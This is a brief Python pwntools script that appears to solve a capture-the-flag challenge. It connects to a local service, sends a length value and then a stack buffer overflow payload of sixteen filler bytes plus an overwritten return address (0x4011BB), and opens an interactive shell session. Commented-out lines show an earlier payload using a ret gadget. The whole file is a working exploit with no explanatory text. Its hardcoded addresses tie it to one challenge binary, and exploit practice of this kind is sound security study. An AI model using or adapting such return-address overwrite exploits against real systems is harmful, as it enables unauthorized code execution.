from pwn import *
context(arch='amd64', os='linux', log_level='debug', terminal=['wt.exe','wsl'])
# p = process('./pwn')
p = remote('127.0.0.1',43053)
ret = 0x40101a
# p = gdb.debug('./pwn', 'b main')
# p.sendline(b'32')
# payload = 16 * b'a' + p64(ret) + p64(0x4011B6)
# p.send(payload)
p.recvuntil(b"stack?\n")
p.sendline(b"24")
p.send(b"A" * 16 + p64(0x4011BB))
p.interactive()